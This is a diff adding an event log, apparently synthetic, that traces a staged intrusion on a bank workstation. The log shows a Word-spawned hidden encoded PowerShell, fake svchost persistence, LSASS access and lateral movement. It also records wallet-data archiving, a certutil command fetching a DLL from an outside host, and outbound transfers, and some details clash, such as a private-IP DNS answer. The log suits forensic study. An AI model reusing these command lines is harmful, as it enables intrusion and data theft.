@@ -1,0 +1,35 @@
+2026-03-10T08:14:22Z EventID: 1 Process Create: powershell.exe -nop -w hidden -enc aQBmACgAWwBJAG4AdABQAHQAcgBd CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -enc aQBmACgAWwBJAG4AdABQAHQAcgBd ParentImage: WINWORD.EXE User: BANK\jthompson
+
+2026-03-10T08:14:25Z EventID: 3 Network Connection: powershell.exe DestinationIp: 185.220.101.45 DestinationPort: 443 Protocol: tcp DestinationHostname: financial-analytics.com
+
+2026-03-10T08:14:31Z EventID: 11 File Created: TargetFilename: C:\Users\jthompson\AppData\Roaming\Microsoft\svchost.exe Image: powershell.exe
+
+2026-03-10T08:14:33Z EventID: 13 Registry Value Set: TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate Details: C:\Users\jthompson\AppData\Roaming\Microsoft\svchost.exe Image: powershell.exe
+
+2026-03-12T14:22:01Z EventID: 1 Process Create: cmd.exe /c whoami /all CommandLine: whoami /all ParentImage: svchost.exe User: BANK\jthompson
+
+2026-03-12T14:22:18Z EventID: 1 Process Create: cmd.exe /c nltest /domain_trusts CommandLine: nltest /domain_trusts ParentImage: svchost.exe
+
+2026-03-17T09:31:44Z EventID: 10 Process Access: SourceImage: C:\Users\jthompson\AppData\Roaming\Microsoft\svchost.exe TargetImage: C:\Windows\System32\lsass.exe GrantedAccess: 0x1010
+
+2026-03-17T09:32:02Z EventID: 4624 Logon Type 10 (RemoteInteractive) TargetUserName: svc_finance SourceNetworkAddress: 10.0.0.25 WorkstationName: FIN-SERVER01
+
+2026-03-17T09:33:15Z EventID: 4648 Explicit Credential Logon: SubjectUserName: jthompson TargetUserName: svc_finance TargetServerName: FIN-SERVER01
+
+2026-03-21T11:05:33Z EventID: 1 Process Create: 7z.exe a -mx9 C:\Users\Public\report.7z C:\Financial\WalletData\ CommandLine: "C:\Program Files\7-Zip\7z.exe" a -mx9 report.7z ParentImage: svchost.exe
+
+2026-03-22T10:15:00Z EventID: 3 Network Connection: svchost.exe DestinationIp: 185.220.101.45 DestinationPort: 443 DestinationHostname: crypto-market-data.net
+
+2026-03-24T14:07:22Z EventID: 1 Process Create: certutil.exe -urlcache -split -f https://secure-banking-portal.org/update.dll C:\ProgramData\update.dll ParentImage: svchost.exe
+
+2026-03-24T14:08:01Z EventID: 7 Image Loaded: ImageLoaded: C:\ProgramData\update.dll Image: rundll32.exe Signed: false
+
+2026-03-25T09:45:11Z EventID: 22 DNS Query: QueryName: secure-banking-portal.org Image: svchost.exe QueryResults: 192.168.1.50
+
+2026-03-27T13:30:45Z EventID: 1 Process Create: schtasks.exe /create /tn "SystemHealthCheck" /tr "C:\ProgramData\update.dll" /sc daily /st 09:00 ParentImage: svchost.exe
+
+2026-03-28T10:22:33Z EventID: 4698 Scheduled Task Created: TaskName: SystemHealthCheck
+
+2026-03-29T11:00:02Z EventID: 15 File Created Stream: TargetFilename: C:\Users\Public\Documents\financials_q1.xlsx:Zone.Identifier Image: svchost.exe
+
+2026-03-30T09:18:44Z EventID: 3 Network Connection: svchost.exe DestinationIp: 185.220.101.45 DestinationPort: 443 BytesSent: 102400 Protocol: tcp
